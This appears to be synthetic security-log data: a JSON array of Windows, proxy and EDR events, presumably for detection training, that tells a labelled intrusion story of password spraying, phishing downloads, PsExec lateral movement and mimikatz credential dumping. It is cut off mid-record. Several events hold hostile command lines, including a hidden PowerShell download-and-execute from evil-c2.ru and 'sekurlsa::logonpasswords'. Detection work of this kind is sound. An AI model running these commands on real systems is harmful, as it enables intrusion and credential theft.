  {
    "timestamp": "2024-03-01T00:46:56.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "lchen",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user lchen from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:48:17.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "bmorris",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user bmorris from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:48:46.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "trobinson",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user trobinson from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:49:08.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "mwilson",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user mwilson from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:49:18.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "adavis",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user adavis from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:51:20.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "kpatel",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user kpatel from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:52:04.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "rjohnson",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user rjohnson from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:53:40.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "emartinez",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user emartinez from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:53:40.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "rjohnson",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user rjohnson from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:53:49.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "jsmith",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user jsmith from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:54:14.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "adavis",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user adavis from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:55:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "adavis",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user adavis from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:55:07.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "mwilson",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user mwilson from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:55:21.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "adavis",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user adavis from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:55:38.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "kpatel",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user kpatel from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:55:40.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "lchen",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user lchen from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:56:36.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "adavis",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user adavis from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:56:53.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "lchen",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user lchen from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:56:55.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "bmorris",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user bmorris from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:58:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "emartinez",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user emartinez from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T00:58:36.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4625,
    "category": "brute_force",
    "action": "failed_login",
    "user": "bmorris",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "failure_reason": "Unknown user name or bad password",
    "logon_type": 3,
    "severity": "high",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1110.003 - Password Spraying",
    "message": "Account logon failure for user bmorris from 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T01:00:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4624,
    "category": "credential_stuffing",
    "action": "successful_login",
    "user": "jsmith",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "logon_type": 3,
    "severity": "critical",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1078 - Valid Accounts",
    "message": "Successful logon for jsmith from known malicious IP 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T01:03:00.000+0000",
    "source": "WinEventLog:System",
    "host": "WORKSTATION01",
    "EventCode": 4648,
    "category": "normal",
    "action": "successful_login",
    "user": "bmorris",
    "src_ip": "10.0.1.179",
    "dest_ip": "10.0.1.179",
    "severity": "low",
    "message": "Normal activity: bmorris authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T01:05:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4624,
    "category": "credential_stuffing",
    "action": "successful_login",
    "user": "jsmith",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "logon_type": 3,
    "severity": "critical",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1078 - Valid Accounts",
    "message": "Successful logon for jsmith from known malicious IP 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T01:05:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "jsmith",
    "src_ip": "10.0.2.208",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_5786.exe",
    "file_name": "invoice_3068.exe",
    "file_hash": "f0e1d2c3b4a5968778695a4b3c2d1e0f",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User jsmith downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:10:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "DC01",
    "EventCode": 4624,
    "category": "credential_stuffing",
    "action": "successful_login",
    "user": "jsmith",
    "src_ip": "185.220.101.45",
    "dest_ip": "10.0.1.10",
    "dest_host": "DC01",
    "logon_type": 3,
    "severity": "critical",
    "ioc_ip": "185.220.101.45",
    "attack_technique": "T1078 - Valid Accounts",
    "message": "Successful logon for jsmith from known malicious IP 185.220.101.45"
  },
  {
    "timestamp": "2024-03-01T01:13:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "jsmith",
    "src_ip": "10.0.0.195",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_5658.exe",
    "file_name": "invoice_8690.exe",
    "file_hash": "f0e1d2c3b4a5968778695a4b3c2d1e0f",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User jsmith downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:14:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "adavis",
    "src_ip": "10.0.4.51",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_9056.exe",
    "file_name": "invoice_2213.exe",
    "file_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User adavis downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:15:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "trobinson",
    "src_ip": "10.0.1.130",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_2958.exe",
    "file_name": "invoice_9779.exe",
    "file_hash": "a3b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User trobinson downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:22:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "lchen",
    "src_ip": "10.0.5.29",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_9751.exe",
    "file_name": "invoice_3073.exe",
    "file_hash": "deadbeefcafebabedeadbeefcafebabe",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User lchen downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:24:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "trobinson",
    "src_ip": "10.0.3.57",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_5530.exe",
    "file_name": "invoice_9595.exe",
    "file_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User trobinson downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:28:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "kpatel",
    "src_ip": "10.0.4.109",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_6016.exe",
    "file_name": "invoice_7046.exe",
    "file_hash": "f0e1d2c3b4a5968778695a4b3c2d1e0f",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User kpatel downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:31:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "adavis",
    "src_ip": "10.0.2.208",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_7818.exe",
    "file_name": "invoice_4697.exe",
    "file_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User adavis downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:36:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "adavis",
    "src_ip": "10.0.4.23",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_5853.exe",
    "file_name": "invoice_4727.exe",
    "file_hash": "deadbeefcafebabedeadbeefcafebabe",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User adavis downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:48:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "swhite",
    "src_ip": "10.0.5.140",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_5871.exe",
    "file_name": "invoice_8025.exe",
    "file_hash": "deadbeefcafebabedeadbeefcafebabe",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User swhite downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T01:50:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION01",
    "EventCode": 4648,
    "category": "normal",
    "action": "successful_login",
    "user": "bmorris",
    "src_ip": "10.0.2.63",
    "dest_ip": "10.0.2.208",
    "severity": "low",
    "message": "Normal activity: bmorris authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T01:56:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "bmorris",
    "src_ip": "10.0.5.190",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_1841.exe",
    "file_name": "invoice_5136.exe",
    "file_hash": "f0e1d2c3b4a5968778695a4b3c2d1e0f",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User bmorris downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T02:00:00.000+0000",
    "source": "WinEventLog:System",
    "host": "SERVER01",
    "EventCode": 7045,
    "category": "lateral_movement",
    "action": "service_installed",
    "user": "jsmith",
    "process": "psexec.exe",
    "src_host": "WORKSTATION03",
    "dest_host": "SERVER01",
    "service_name": "PSEXESVC",
    "severity": "critical",
    "attack_technique": "T1021.002 - SMB/Windows Admin Shares",
    "message": "PsExec service installed on SERVER01 by jsmith from WORKSTATION03"
  },
  {
    "timestamp": "2024-03-01T02:00:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "swhite",
    "src_ip": "10.0.5.140",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_1282.exe",
    "file_name": "invoice_2524.exe",
    "file_hash": "deadbeefcafebabedeadbeefcafebabe",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User swhite downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T02:08:00.000+0000",
    "source": "WinEventLog:System",
    "host": "DC02",
    "EventCode": 7045,
    "category": "lateral_movement",
    "action": "service_installed",
    "user": "jsmith",
    "process": "psexec.exe",
    "src_host": "WORKSTATION02",
    "dest_host": "DC02",
    "service_name": "PSEXESVC",
    "severity": "critical",
    "attack_technique": "T1021.002 - SMB/Windows Admin Shares",
    "message": "PsExec service installed on DC02 by jsmith from WORKSTATION02"
  },
  {
    "timestamp": "2024-03-01T02:10:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "rjohnson",
    "src_ip": "10.0.4.7",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_7971.exe",
    "file_name": "invoice_6419.exe",
    "file_hash": "deadbeefcafebabedeadbeefcafebabe",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User rjohnson downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T02:16:00.000+0000",
    "source": "WinEventLog:System",
    "host": "SERVER01",
    "EventCode": 7045,
    "category": "lateral_movement",
    "action": "service_installed",
    "user": "jsmith",
    "process": "psexec.exe",
    "src_host": "WORKSTATION02",
    "dest_host": "SERVER01",
    "service_name": "PSEXESVC",
    "severity": "critical",
    "attack_technique": "T1021.002 - SMB/Windows Admin Shares",
    "message": "PsExec service installed on SERVER01 by jsmith from WORKSTATION02"
  },
  {
    "timestamp": "2024-03-01T02:20:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "jsmith",
    "src_ip": "10.0.5.27",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_3444.exe",
    "file_name": "invoice_5978.exe",
    "file_hash": "44d88612fea8a8f36de82e1278abb02f",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User jsmith downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T02:24:00.000+0000",
    "source": "WinEventLog:System",
    "host": "SERVER01",
    "EventCode": 7045,
    "category": "lateral_movement",
    "action": "service_installed",
    "user": "jsmith",
    "process": "psexec.exe",
    "src_host": "WORKSTATION03",
    "dest_host": "SERVER01",
    "service_name": "PSEXESVC",
    "severity": "critical",
    "attack_technique": "T1021.002 - SMB/Windows Admin Shares",
    "message": "PsExec service installed on SERVER01 by jsmith from WORKSTATION03"
  },
  {
    "timestamp": "2024-03-01T02:27:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4648,
    "category": "normal",
    "action": "logoff",
    "user": "adavis",
    "src_ip": "10.0.3.151",
    "dest_ip": "10.0.2.63",
    "severity": "low",
    "message": "Normal activity: adavis authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T02:29:00.000+0000",
    "source": "proxy",
    "host": "PROXY01",
    "category": "phishing",
    "action": "file_download",
    "user": "swhite",
    "src_ip": "10.0.0.8",
    "dest_ip": "194.165.16.78",
    "url": "http://phish-bank.com/invoice_6023.exe",
    "file_name": "invoice_5118.exe",
    "file_hash": "a3b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7",
    "severity": "high",
    "ioc_domain": "phish-bank.com",
    "ioc_ip": "194.165.16.78",
    "attack_technique": "T1566.002 - Spearphishing Link",
    "message": "User swhite downloaded malicious executable from phishing site"
  },
  {
    "timestamp": "2024-03-01T02:32:00.000+0000",
    "source": "WinEventLog:System",
    "host": "DC02",
    "EventCode": 7045,
    "category": "lateral_movement",
    "action": "service_installed",
    "user": "jsmith",
    "process": "psexec.exe",
    "src_host": "WORKSTATION03",
    "dest_host": "DC02",
    "service_name": "PSEXESVC",
    "severity": "critical",
    "attack_technique": "T1021.002 - SMB/Windows Admin Shares",
    "message": "PsExec service installed on DC02 by jsmith from WORKSTATION03"
  },
  {
    "timestamp": "2024-03-01T02:42:00.000+0000",
    "source": "WinEventLog:System",
    "host": "WORKSTATION03",
    "EventCode": 4648,
    "category": "normal",
    "action": "network_access",
    "user": "kpatel",
    "src_ip": "10.0.5.190",
    "dest_ip": "10.0.5.29",
    "severity": "low",
    "message": "Normal activity: kpatel authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T02:45:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4624,
    "category": "normal",
    "action": "successful_login",
    "user": "swhite",
    "src_ip": "10.0.4.23",
    "dest_ip": "10.0.0.190",
    "severity": "low",
    "message": "Normal activity: swhite authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T02:53:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4624,
    "category": "normal",
    "action": "network_access",
    "user": "adavis",
    "src_ip": "10.0.4.7",
    "dest_ip": "10.0.5.27",
    "severity": "low",
    "message": "Normal activity: adavis authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T02:56:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION01",
    "EventCode": 4648,
    "category": "normal",
    "action": "successful_login",
    "user": "jsmith",
    "src_ip": "10.0.2.63",
    "dest_ip": "10.0.0.8",
    "severity": "low",
    "message": "Normal activity: jsmith authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T03:00:00.000+0000",
    "source": "edr",
    "host": "DC01",
    "EventCode": 4688,
    "category": "credential_dumping",
    "action": "process_created",
    "user": "jsmith",
    "process": "mimikatz.exe",
    "parent_process": "cmd.exe",
    "cmdline": "mimikatz.exe sekurlsa::logonpasswords",
    "file_hash": "44d88612fea8a8f36de82e1278abb02f",
    "severity": "critical",
    "ioc_hash": "44d88612fea8a8f36de82e1278abb02f",
    "attack_technique": "T1003.001 - LSASS Memory",
    "message": "Mimikatz execution detected - credential dumping attempt"
  },
  {
    "timestamp": "2024-03-01T03:15:00.000+0000",
    "source": "edr",
    "host": "SERVER01",
    "EventCode": 4688,
    "category": "credential_dumping",
    "action": "process_created",
    "user": "jsmith",
    "process": "mimikatz.exe",
    "parent_process": "cmd.exe",
    "cmdline": "mimikatz.exe sekurlsa::logonpasswords",
    "file_hash": "44d88612fea8a8f36de82e1278abb02f",
    "severity": "critical",
    "ioc_hash": "44d88612fea8a8f36de82e1278abb02f",
    "attack_technique": "T1003.001 - LSASS Memory",
    "message": "Mimikatz execution detected - credential dumping attempt"
  },
  {
    "timestamp": "2024-03-01T03:15:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4634,
    "category": "normal",
    "action": "logoff",
    "user": "rjohnson",
    "src_ip": "10.0.2.208",
    "dest_ip": "10.0.5.167",
    "severity": "low",
    "message": "Normal activity: rjohnson authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T03:26:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION04",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "swhite",
    "process": "powershell.exe",
    "parent_process": "winword.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION04"
  },
  {
    "timestamp": "2024-03-01T03:30:00.000+0000",
    "source": "edr",
    "host": "DC01",
    "EventCode": 4688,
    "category": "credential_dumping",
    "action": "process_created",
    "user": "jsmith",
    "process": "mimikatz.exe",
    "parent_process": "cmd.exe",
    "cmdline": "mimikatz.exe sekurlsa::logonpasswords",
    "file_hash": "44d88612fea8a8f36de82e1278abb02f",
    "severity": "critical",
    "ioc_hash": "44d88612fea8a8f36de82e1278abb02f",
    "attack_technique": "T1003.001 - LSASS Memory",
    "message": "Mimikatz execution detected - credential dumping attempt"
  },
  {
    "timestamp": "2024-03-01T03:32:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "svc_sql",
    "process": "powershell.exe",
    "parent_process": "winword.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION02"
  },
  {
    "timestamp": "2024-03-01T03:32:00.000+0000",
    "source": "proxy",
    "host": "WORKSTATION03",
    "EventCode": 4624,
    "category": "normal",
    "action": "network_access",
    "user": "rjohnson",
    "src_ip": "10.0.1.130",
    "dest_ip": "10.0.1.179",
    "severity": "low",
    "message": "Normal activity: rjohnson authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T03:34:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION04",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "bmorris",
